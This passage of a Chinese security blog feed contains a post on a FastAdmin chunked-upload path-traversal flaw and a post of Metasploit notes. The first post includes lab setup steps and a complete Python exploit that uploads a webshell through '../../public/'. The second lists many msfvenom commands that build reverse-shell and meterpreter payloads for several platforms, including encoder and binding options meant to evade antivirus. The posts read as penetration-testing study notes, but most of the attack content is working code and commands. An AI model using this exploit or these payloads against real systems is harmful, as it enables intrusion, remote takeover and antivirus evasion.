class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">  <span class="comment">/**</span></span><br><span class="line"><span class="comment">   * 合并分片文件</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $chunkid</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> int    $chunkcount</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@param</span> string $filename</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@return</span> attachment|\think\Model</span></span><br><span class="line"><span class="comment">   * <span class="doctag">@throws</span> UploadException</span></span><br><span class="line"><span class="comment">   */</span></span><br><span class="line">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">merge</span><span class="params">($chunkid, $chunkcount, $filename)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">      $filePath = <span class="keyword">$this</span>-&gt;chunkDir . DS . $chunkid;</span><br><span class="line"></span><br><span class="line">      $completed = <span class="keyword">true</span>;</span><br><span class="line">      <span class="comment">//检查所有分片是否都存在</span></span><br><span class="line">      <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $chunkcount; $i++) &#123;</span><br><span class="line">          <span class="keyword">if</span> (!file_exists(<span class="string">"&#123;$filePath&#125;-&#123;$i&#125;.part"</span>)) &#123;</span><br><span class="line">              $completed = <span class="keyword">false</span>;</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (!$completed) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;clean($chunkid);</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> UploadException(__(<span class="string">'Chunk file info error'</span>));</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//如果所有文件分片都上传完毕，开始合并</span></span><br><span class="line">      $uploadPath = $filePath;</span><br><span class="line"><span class="comment">// $destFile就是$uploadPath，也就是$filePath</span></span><br><span class="line">      <span class="keyword">if</span> (!$destFile = @fopen($uploadPath, <span class="string">"wb"</span>)) &#123;</span><br><span class="line">          <span class="keyword">$this</span>-&gt;clean($chunkid);</span><br><span class="line">          <span class="keyword">throw</span> <span class="keyword">new</span> UploadException(__(<span class="string">'Chunk file merge error'</span>));</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> (flock($destFile, LOCK_EX)) &#123; <span class="comment">// 进行排他型锁定</span></span><br><span class="line">          <span class="comment">// 从0到chunkcount分片数，把所有.part文件进行合并</span></span><br><span class="line">          <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; $chunkcount; $i++) &#123;</span><br><span class="line">              $partFile = <span class="string">"&#123;$filePath&#125;-&#123;$i&#125;.part"</span>;</span><br><span class="line">              <span class="keyword">if</span> (!$handle = @fopen($partFile, <span class="string">"rb"</span>)) &#123;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">              &#125;</span><br><span class="line">              <span class="comment">// 写入文件，位置为destFile</span></span><br><span class="line">              <span class="keyword">while</span> ($buff = fread($handle, filesize($partFile))) &#123;</span><br><span class="line">                  fwrite($destFile, $buff);</span><br><span class="line">              &#125;</span><br><span class="line">              @fclose($handle);</span><br><span class="line">              @unlink($partFile); <span class="comment">//删除分片</span></span><br><span class="line">          &#125;</span><br><span class="line"></span><br><span class="line">          flock($destFile, LOCK_UN);</span><br><span class="line">      &#125;</span><br><span class="line">      @fclose($destFile);</span><br><span class="line"></span><br><span class="line">      $file = <span class="keyword">new</span> File($uploadPath);</span><br><span class="line">      $info = [</span><br><span class="line">          <span class="string">'name'</span>     =&gt; $filename,</span><br><span class="line">          <span class="string">'type'</span>     =&gt; $file-&gt;getMime(),</span><br><span class="line">          <span class="string">'tmp_name'</span> =&gt; $uploadPath,</span><br><span class="line">          <span class="string">'error'</span>    =&gt; <span class="number">0</span>,</span><br><span class="line">          <span class="string">'size'</span>     =&gt; $file-&gt;getSize()</span><br><span class="line">      ];</span><br><span class="line">      $file-&gt;setSaveName($filename)-&gt;setUploadInfo($info);</span><br><span class="line">      $file-&gt;isTest(<span class="keyword">true</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//重新设置文件</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;setFile($file);</span><br><span class="line"></span><br><span class="line">      <span class="keyword">unset</span>($file);</span><br><span class="line">      <span class="keyword">$this</span>-&gt;merging = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">      <span class="comment">//允许大文件</span></span><br><span class="line">      <span class="keyword">$this</span>-&gt;config[<span class="string">'maxsize'</span>] = <span class="string">"1024G"</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;upload();</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>merge源码逻辑：</p><ol><li>根据chunkcount分片数检查所有分片.part是否都存在</li><li>如果所有文件分片都上传完毕，开始合并：从0到chunkcount分片数，把所有.part文件进行合并，写入文件，位置为destFile，由于<code>$destFile = @fopen($uploadPath, &quot;wb&quot;)</code>而<code>$uploadPath = $filePath</code>并且<code>$filePath = $this-&gt;chunkDir . DS . $chunkid</code>，因此$destFile就是POST传入的chunkid值，因此chunkid如果是包含路径的文件名的话，就可以指定文件存放位置。chunkDir根据源码知道是RUNTIEM_PATH[即runtime]+chunks，其实就是fastadmin项目目录的runtime/chunks，DS是DIRECTORY_SEPARATOR，查了下DIRECTORY_SEPARATOR就是显示系统分隔符的命令 通俗讲就是转换适合系统的文件分隔符，所以如果想让webshell放置在<a href="http://ip/webshell.php" target="_blank" rel="noopener">http://ip/webshell.php</a> ，构造chunkDir就可以用<code>../../public/webshell.php</code>来达成目的。</li></ol><p><img src="/imgs/image-20210408094404668.png" alt="image-20210408094404668"></p><p><img src="/imgs/image-20210408094640492.png" alt="image-20210408094640492"></p><h4 id="4、梳理漏洞信息"><a href="#4、梳理漏洞信息" class="headerlink" title="4、梳理漏洞信息"></a>4、梳理漏洞信息</h4><p>根据上面代码逻辑梳理</p><ol><li>post上传，需要chunkid、action、chunkindex、chunkcount、filename，其中chunkid是可包含存放路径的文件名，action属于文件操作（merge是合并、clean是删除冗余，其它情况就是上传分片）、chunkindex是分片位置，chunkcount是分片数，filename是文件名；另外文件类型需要是application/octet-stream</li><li>指定文件合并的话<code>action=merge&amp;chunkid=../../public/webshell.php&amp;chunkindex=0&amp;chunkcount=1&amp;filename=webshell.php-0.part</code>就可以达到合并的目的</li></ol><h3 id="三、搭建漏洞环境"><a href="#三、搭建漏洞环境" class="headerlink" title="三、搭建漏洞环境"></a>三、搭建漏洞环境</h3><h4 id="1、下载Fastadmin：V1-2-0-20201001-beta"><a href="#1、下载Fastadmin：V1-2-0-20201001-beta" class="headerlink" title="1、下载Fastadmin：V1.2.0.20201001_beta"></a>1、下载Fastadmin：<a href="https://www.fastadmin.net/download/full.html?version=1.2.0.20201001_beta" target="_blank" rel="noopener">V1.2.0.20201001_beta</a></h4><h4 id="2、搭建php-mysql-nginx环境"><a href="#2、搭建php-mysql-nginx环境" class="headerlink" title="2、搭建php+mysql+nginx环境"></a>2、搭建php+mysql+nginx环境</h4><p>使用docker-phper搭建，搭建步骤参考：<a href="https://ask.fastadmin.net/article/12492.html" target="_blank" rel="noopener">docker 一键部署fastadmin</a>，默认mysql密码是root/123456</p><h4 id="3、问题解决："><a href="#3、问题解决：" class="headerlink" title="3、问题解决："></a>3、问题解决：</h4><p>搭建环境遇到了很多问题，遇到的问题不少，基本通过下面几个链接可以解决：</p><p><a href="https://ask.fastadmin.net/question/1905.html" target="_blank" rel="noopener">https://ask.fastadmin.net/question/1905.html</a></p><p><a href="https://blog.csdn.net/qq_39999924/article/details/103716808" target="_blank" rel="noopener">https://blog.csdn.net/qq_39999924/article/details/103716808</a></p><p><a href="https://ask.fastadmin.net/article/1145.html" target="_blank" rel="noopener">https://ask.fastadmin.net/article/1145.html</a></p><p>如果还报错：当前权限不足，无法写入配置文件application/database.php，可以<code>cd application &amp;&amp; chmod 777 *.php</code></p><p>另外如果拉取镜像过程中有提示下载某个文件失败，可以添加下镜像源如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">[root@localhost docker-phper]# vim &#x2F;etc&#x2F;docker&#x2F;daemon.json</span><br><span class="line">&#123;</span><br><span class="line">    &quot;registry-mirrors&quot;: [&quot;http:&#x2F;&#x2F;hub-mirror.c.163.com&quot;,&quot;http:&#x2F;&#x2F;18817714.m.daocloud.io&quot;]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="4、install-php安装"><a href="#4、install-php安装" class="headerlink" title="4、install.php安装"></a>4、install.php安装</h4><p>访问install.php填写相关信息进行按照</p><p><img src="/imgs/image-20210407180936669.png" alt="image-20210407180936669"></p><p><img src="/imgs/image-20210407182123714.png" alt="image-20210407182123714"></p><h4 id="5、漏洞利用条件设置"><a href="#5、漏洞利用条件设置" class="headerlink" title="5、漏洞利用条件设置"></a>5、漏洞利用条件设置</h4><ol><li>需要注册普通用户</li><li>设置application/extra/upload.php的chunking为true</li></ol><p><img src="/imgs/image-20210407190303993.png" alt="image-20210407180936669"></p><p>至此，环境搭建完毕。</p><h3 id="四、复现EXP"><a href="#四、复现EXP" class="headerlink" title="四、复现EXP"></a>四、复现EXP</h3><p>把webshell放在同目录下进行复现即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> urllib3.exceptions <span class="keyword">import</span> InsecureRequestWarning</span><br><span class="line">requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)</span><br><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">FastAdmin_Fileupload_20210407</span>:</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span><span class="params">(self, url)</span>:</span></span><br><span class="line">        self.url = url</span><br><span class="line">        <span class="comment"># 需要假定格式为 ip:port 或者 https://ip:port，否则会报错</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"http"</span> <span class="keyword">not</span> <span class="keyword">in</span> url:</span><br><span class="line">            self.ip = url.split(<span class="string">':'</span>)[<span class="number">0</span>]</span><br><span class="line">            self.port = url.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="keyword">if</span> <span class="string">'443'</span> <span class="keyword">in</span> url:</span><br><span class="line">                self.url = <span class="string">"https://"</span> + self.url</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                self.url = <span class="string">"http://"</span> + self.url</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.ip = url.split(<span class="string">':'</span>)[<span class="number">1</span>]</span><br><span class="line">            self.port = url.split(<span class="string">':'</span>)[<span class="number">2</span>]</span><br><span class="line">            </span><br><span class="line">        self.info = &#123;</span><br><span class="line">            <span class="string">"VUL"</span>: <span class="string">"Fastadmin_FileUpload_0407"</span>,</span><br><span class="line">            <span class="string">"VUL_NAME"</span>: <span class="string">"Fastadmin前台文件上传漏洞"</span>,</span><br><span class="line">            <span class="string">"TYPE"</span>: <span class="string">"FileUpload"</span>,</span><br><span class="line">            <span class="string">"DESCRIPTION"</span>: <span class="string">"FastAdmin 1.2.0版本爆出存在低权限用户有条件RCE的漏洞。当开启了分片上传功能时，fastadmin 会根据传入的 chunkid ，结合硬编码后缀来命名和保存文件，攻击者可预测文件上传路径；此后攻击者提交 分片合并 请求时，fastadmin 将会根据传入的 chunkid ，去除了上一步操作中文件名的硬编码后保存新文件，导致任意文件上传。"</span>,</span><br><span class="line">            <span class="string">"IMPACT"</span>: <span class="string">"FastAdmin 1.2.0 &lt; V1.2.0.20210401_beta"</span>,</span><br><span class="line">            <span class="string">"REFERENCE"</span>: <span class="string">"https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg"</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(self, cookie)</span>:</span></span><br><span class="line">        vulUrl = self.url + <span class="string">'/index/ajax/upload'</span></span><br><span class="line">        chunkid = <span class="string">'webshell.php'</span></span><br><span class="line">        file = &#123;</span><br><span class="line">            <span class="string">'file'</span>: (chunkid, open(<span class="string">'webshell.php'</span>, <span class="string">'rb'</span>), <span class="string">'application/octet-stream'</span>)</span><br><span class="line">        &#125;</span><br><span class="line">        data = &#123;</span><br><span class="line">            <span class="string">'chunkid'</span>: <span class="string">'../../public/%s'</span> % chunkid,</span><br><span class="line">            <span class="string">'chunkindex'</span>: <span class="number">0</span>,</span><br><span class="line">            <span class="string">'chunkcount'</span>: <span class="number">1</span></span><br><span class="line">        &#125;</span><br><span class="line">        headers = &#123;</span><br><span class="line">            <span class="string">'User-Agent'</span>: <span class="string">'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:86.0) Gecko/20100101 Firefox/86.0'</span>,</span><br><span class="line">            <span class="string">'Cookie'</span>: cookie,</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            rsp_upload = requests.post(url=vulUrl, files=file, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">20</span>)</span><br><span class="line">            result = loads(rsp_upload.text)</span><br><span class="line">            <span class="keyword">if</span> rsp_upload.status_code == <span class="number">200</span> <span class="keyword">and</span> result[<span class="string">'code'</span>] == <span class="number">1</span> <span class="keyword">and</span> result[<span class="string">'msg'</span>] == <span class="string">''</span> <span class="keyword">and</span> result[<span class="string">'data'</span>] == <span class="literal">None</span>:</span><br><span class="line">                data = &#123;</span><br><span class="line">                    <span class="string">'action'</span>: <span class="string">'merge'</span>,</span><br><span class="line">                    <span class="string">'chunkid'</span>: <span class="string">'../../public/%s'</span> % chunkid,</span><br><span class="line">                    <span class="string">'chunkindex'</span>: <span class="number">0</span>,</span><br><span class="line">                    <span class="string">'chunkcount'</span>: <span class="number">1</span>,</span><br><span class="line">                    <span class="string">'filename'</span>: <span class="string">'%s-0.part'</span> % chunkid</span><br><span class="line">                &#125;</span><br><span class="line">                rsp = requests.post(vulUrl, data=data, headers=headers, verify=<span class="literal">False</span>, timeout=<span class="number">20</span>)</span><br><span class="line">                <span class="keyword">if</span> rsp.status_code == <span class="number">200</span>:</span><br><span class="line">                    print(<span class="string">'webshell path: '</span> + self.url + <span class="string">'/%s'</span> % chunkid)</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">                <span class="keyword">else</span>:</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            print(e)</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    url = <span class="string">"http://192.168.116.132:80"</span></span><br><span class="line">    vul = FastAdmin_Fileupload_20210407(url)</span><br><span class="line">    cookie = <span class="string">'PHPSESSID=luanbpjfh61ra83juitgoureho; uid=2; token=68772899-f4f2-4737-aff0-b6b727a585dc'</span></span><br><span class="line">    vul.exp(cookie=cookie)</span><br></pre></td></tr></table></figure><h3 id="参考链接："><a href="#参考链接：" class="headerlink" title="参考链接："></a>参考链接：</h3><p><a href="https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/otrH75ZjCHBQbRB7g5DdWg</a></p><p><a href="https://ask.fastadmin.net/article/12492.html" target="_blank" rel="noopener">https://ask.fastadmin.net/article/12492.html</a></p><p><a href="https://ask.fastadmin.net/question/1905.html" target="_blank" rel="noopener">https://ask.fastadmin.net/question/1905.html</a></p><p><a href="https://blog.csdn.net/qq_39999924/article/details/103716808" target="_blank" rel="noopener">https://blog.csdn.net/qq_39999924/article/details/103716808</a></p><p><a href="https://ask.fastadmin.net/article/1145.html" target="_blank" rel="noopener">https://ask.fastadmin.net/article/1145.html</a></p>]]></content>
      
      
      <categories>
          
          <category> Fastadmin </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 文件上传 </tag>
            
            <tag> Fastadmin </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>MSF笔记</title>
      <link href="2021/03/03/MSF%E7%AC%94%E8%AE%B0/"/>
      <url>2021/03/03/MSF%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h3 id="各大模块："><a href="#各大模块：" class="headerlink" title="各大模块："></a>各大模块：</h3><p>msf共有7个模块</p><p><img src="/imgs/image-20210303093725102.png" alt="image-20210303093725102"></p><ol><li>auxiliary：主要包含辅助性脚本（扫描、嗅探、注入、爆破，漏洞挖掘）</li><li>encoders：主要包含各种编码工具，以便绕过入侵检测和过滤系统</li><li>evasion：主要用于生成Windows免杀木马，以绕过360、火绒等的查杀</li><li>exploits：漏洞利用，包含主流的漏洞利用脚本，exp命名规则:系统/服务/模块</li><li>nops：绕过针对溢出攻击滑行字符串的拦截检测</li><li>payloads：攻击荷载，目标系统在被渗透攻击后而执行的代码</li><li>post：后渗透模块，向目标发送的一些功能性指令，如提权，获取hash等</li></ol><h3 id="常用操作命令"><a href="#常用操作命令" class="headerlink" title="常用操作命令"></a>常用操作命令</h3><p>基础命令：</p><p><img src="/imgs/image-20210303100031590.png" alt="image-20210303100031590"></p><figure class="highlight bash"><figcaption><span>核心命令</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">banner <span class="comment">#用于查看metasploit的版本信息，利用模块数量、payload数量</span></span><br><span class="line">connect <span class="comment">#类似nc connect 10.0.0.138 80</span></span><br><span class="line">load <span class="comment">#加载插件</span></span><br><span class="line">info <span class="comment">#查看所在模块的信息</span></span><br><span class="line">route <span class="comment">#代理转发</span></span><br><span class="line">sessions <span class="comment">#会话id</span></span><br></pre></td></tr></table></figure><p><img src="/imgs/image-20210303100041689.png" alt="image-20210303100041689"></p><p>模块使用命令：</p><p>一般流程：查找模块-&gt;使用模块-&gt;查看并设置参数-&gt;利用</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search module <span class="comment">#查找模块</span></span><br><span class="line">use module <span class="comment">#使用模块</span></span><br><span class="line">options/info <span class="comment">#查看参数</span></span><br><span class="line"><span class="built_in">set</span> options <span class="comment"># 设置参数</span></span><br><span class="line">run/exploit <span class="comment">#利用</span></span><br><span class="line">back/background <span class="comment">#当前会话移到后台</span></span><br></pre></td></tr></table></figure><p>job相关命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">jobs</span> <span class="comment">#查看job</span></span><br><span class="line"><span class="built_in">kill</span> <span class="comment">#杀死进程</span></span><br></pre></td></tr></table></figure><h3 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h3><p>生成木马常用：<a href="https://www.cnblogs.com/daiorz/archive/2004/01/13/12120067.html，https://www.cnblogs.com/gusi/p/12088198.html" target="_blank" rel="noopener">https://www.cnblogs.com/daiorz/archive/2004/01/13/12120067.html，https://www.cnblogs.com/gusi/p/12088198.html</a></p><p>使用方法：</p><p><img src="/imgs/image-20210120152451121.png" alt="image-20210120152451121"></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">参数-p和-f必需。常用参数说明：</span><br><span class="line">-l 列出所有可用的载荷列表（payload）。-l payloads</span><br><span class="line">-p 选择一个payload，也可以自定义payload</span><br><span class="line">-f 生成文件格式，-help-formats，可查看支持的所有输出格式</span><br><span class="line">-e 编码方式，-l encoders，可查看支持使用的编码器</span><br><span class="line">-i 编码次数</span><br><span class="line">-a 系统架构，默认x86，指定平台：--platform xxx，-l platforms</span><br><span class="line">-b 在生成的payload中避免出现的值，msfvenom会自动寻找合适的编码器来编码payload</span><br><span class="line">-x 指定一个自定义的可执行文件作为模板，也就是将木马捆绑到这个可执行文件</span><br><span class="line">-k 当模板被执行时，payload自动分离并注入到新的进程中，一般和-x选项一起使用</span><br><span class="line">-o 指定创建好的payload的存放位置</span><br></pre></td></tr></table></figure><p>反向连接：</p><p>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</p><p>正向连接：</p><p>msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux</span></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt; Your IP Address&gt; LPORT=&lt; Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.exe</span><br><span class="line"><span class="comment"># Mac</span></span><br><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.machoWeb Payloads</span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line"><span class="comment"># ASP</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"><span class="comment"># JSP</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"><span class="comment"># WAR</span></span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war </span><br><span class="line"><span class="comment"># Python</span></span><br><span class="line">msfvenom -p python/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt;  &gt; shell.py</span><br><span class="line">msfvenom -p cmd/unix/reverse_python LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.py</span><br><span class="line"><span class="comment"># Bash</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_bash LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.sh</span><br><span class="line"><span class="comment"># Perl</span></span><br><span class="line">msfvenom -p cmd/unix/reverse_perl LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.pl</span><br></pre></td></tr></table></figure><p>示例：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 普通生成</span></span><br><span class="line">msfvenom -p windows/ meterpreter/reverse_tcp -f exe -o C:\back.exe</span><br><span class="line"><span class="comment"># 编码处理型</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp -i 3 -e x86/shikata_ga_nai -f exe -o C:\back.exe</span><br><span class="line"><span class="comment"># 搁绑</span></span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -x c:\nomal.exe -k -f exe -o c:\shell.exe</span><br><span class="line"><span class="comment"># Windows</span></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -e x86/shikata_ga_nai -b <span class="string">'\x00\x0a\xff'</span> -i 3 -f exe -o x86_shell.exe</span><br><span class="line"><span class="comment"># Linux</span></span><br><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IPAddress&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br><span class="line"><span class="comment"># PowerShell</span></span><br><span class="line">msfvenom -a x86 --platform Windows -p windows/powershell/reverse_tcp LHOST= 192.168.3.12 LPORT=443 -e cmd/powershell_base64 -i 3 -f raw -o x86_shell.ps1 </span><br><span class="line"><span class="comment"># Android</span></span><br><span class="line">msfvenom -a x86 --platform Android -pandroid/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f apk -o x86_shell.apk</span><br><span class="line"><span class="comment"># PHP</span></span><br><span class="line">msfvenom --platform PHP -p php/meterpreter/reverse_tcp LHOST=192.1 68.3.12 LPORT=443 -f raw -o x86_shell.php</span><br><span class="line"><span class="comment"># Asp</span></span><br><span class="line">msfvenom -p windows/meterprete/reverse_tcp LHOST=&lt;Your IPAddress&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"><span class="comment"># Aspx</span></span><br><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.3.12 LPORT=443 -f aspx -o x86_shell.aspx</span><br><span class="line"><span class="comment"># JSP</span></span><br><span class="line">msfvenom --platform java -p java/jsp_shell_reverse_tcp LHOST= 192.168.3.2 